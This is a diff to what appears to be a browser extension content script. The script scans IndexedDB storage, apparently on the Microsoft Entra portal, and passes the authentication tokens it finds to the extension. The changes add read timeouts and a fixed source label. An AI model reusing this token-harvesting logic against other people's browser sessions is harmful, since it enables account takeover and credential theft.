@@ -9,6 +9,8 @@
   const MAX_INDEXED_DB_DATABASES = 12;
   const MAX_INDEXED_DB_STORES = 40;
   const MAX_INDEXED_DB_RECORDS_PER_STORE = 100;
+  const INDEXED_DB_OPEN_TIMEOUT_MS = 1000;
+  const INDEXED_DB_STORE_TIMEOUT_MS = 1500;
   const CAPTURE_RESPONSE_TIMEOUT_MS = 5000;
   let attempts = 0;
   let activeScan;
@@ -65,7 +67,7 @@
           {
             action: "capturePortalTokens",
             tokens,
-            source: `entra.microsoft.com storage: ${location.hash.slice(0, 120)}`
+            source: "Microsoft Entra portal storage"
           },
           (response) => {
             const runtimeError = chrome.runtime.lastError;
@@ -147,14 +149,17 @@
   function openDatabase(databaseName) {
     return new Promise((resolve) => {
       let settled = false;
+      let timeout;
       function finish(value) {
         if (settled) {
           if (value && typeof value.close === "function") value.close();
           return;
         }
         settled = true;
+        clearTimeout(timeout);
         resolve(value);
       }
+      timeout = setTimeout(() => finish(undefined), INDEXED_DB_OPEN_TIMEOUT_MS);
       try {
         const request = window.indexedDB.open(databaseName);
         request.onerror = () => finish(undefined);
@@ -170,16 +175,27 @@
     return new Promise((resolve) => {
       let finished = false;
       let recordsRead = 0;
+      let transaction;
+      let timeout;
 
       function finish() {
         if (!finished) {
           finished = true;
+          clearTimeout(timeout);
           resolve();
         }
       }
 
       try {
-        const transaction = database.transaction(storeName, "readonly");
+        transaction = database.transaction(storeName, "readonly");
+        timeout = setTimeout(() => {
+          try {
+            transaction.abort();
+          } catch {
+            // A completed transaction needs no cancellation.
+          }
+          finish();
+        }, INDEXED_DB_STORE_TIMEOUT_MS);
         const store = transaction.objectStore(storeName);
         const request = store.openCursor();
 
